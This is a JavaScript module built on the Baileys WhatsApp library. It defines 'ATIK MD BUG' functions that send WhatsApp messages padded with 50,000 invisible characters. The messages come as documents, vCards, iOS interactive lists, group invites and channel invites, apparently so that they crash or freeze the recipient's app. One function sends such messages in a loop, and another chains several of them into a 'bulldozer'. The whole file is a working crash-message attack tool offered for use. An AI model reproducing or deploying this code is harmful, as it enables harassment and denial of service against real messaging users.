const { generateWAMessageFromContent, proto } = require('@whiskeysockets/baileys');

const invis = '\u200e'.repeat(50000);

async function sendBug(bad, jid, quoted) {
    await bad.relayMessage(jid, {
        documentMessage: {
            title: '☠️ ATIK MD BUG ☠️' + invis,
            jpegThumbnail: Buffer.alloc(0),
            mimetype: 'application/pdf',
            caption: '☠️ ATIK MD BUG ☠️' + invis
        }
    }, { quoted });
}

async function fcInvisHard(bad, jid, quoted) {
    await bad.relayMessage(jid, {
        contactMessage: {
            displayName: '☠️ ATIK MD HARD ☠️' + invis,
            vcard: 'BEGIN:VCARD\nVERSION:3.0\nFN:' + invis + '\nEND:VCARD'
        }
    }, { quoted });
}

async function delayHard(bad, jid, quoted) {
    for (let i = 0; i < 5; i++) {
        await bad.sendMessage(jid, { text: '☠️ ATIK MD DELAY ☠️' + invis }, { quoted });
    }
}

async function fcInvisIos(bad, jid, quoted) {
    await bad.relayMessage(jid, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: { title: '☠️ ATIK MD IOS ☠️' + invis, hasMediaAttachment: false },
                    body: { text: '☠️ ATIK MD IOS ☠️' + invis },
                    footer: { text: '☠️ ATIK MD IOS ☠️' + invis },
                    nativeFlowMessage: {
                        buttons: [{
                            name: 'single_select',
                            buttonParamsJson: JSON.stringify({
                                title: '☠️ ATIK MD IOS ☠️',
                                sections: [{
                                    title: '☠️ ATIK MD IOS ☠️',
                                    rows: Array(50).fill({ title: '☠️ ATIK MD IOS ☠️', id: 'bug' })
                                }]
                            })
                        }]
                    }
                }
            }
        }
    }, { quoted });
}

async function fcInvisGroup(bad, jid, quoted) {
    await bad.relayMessage(jid, {
        groupInviteMessage: {
            groupJid: jid,
            inviteCode: 'atikmdbug',
            inviteExpiration: 0,
            groupName: '☠️ ATIK MD GROUP ☠️' + invis,
            caption: '☠️ ATIK MD GROUP ☠️' + invis
        }
    }, { quoted });
}

async function invisBulldozer(bad, jid, quoted) {
    await sendBug(bad, jid, quoted);
    await fcInvisHard(bad, jid, quoted);
    await fcInvisIos(bad, jid, quoted);
}

async function fcInvisChannel(bad, jid, quoted) {
    await bad.relayMessage(jid, {
        newsletterInviteMessage: {
            newsletterJid: '120363409543800266@newsletter',
            newsletterName: '☠️ ATIK MD CHANNEL ☠️' + invis,
            caption: '☠️ ATIK MD CHANNEL ☠️' + invis
        }
    }, { quoted });
}

module.exports = {
    sendBug,
    fcInvisHard,
    delayHard,
    fcInvisIos,
    fcInvisGroup,
    invisBulldozer,
    fcInvisChannel
};
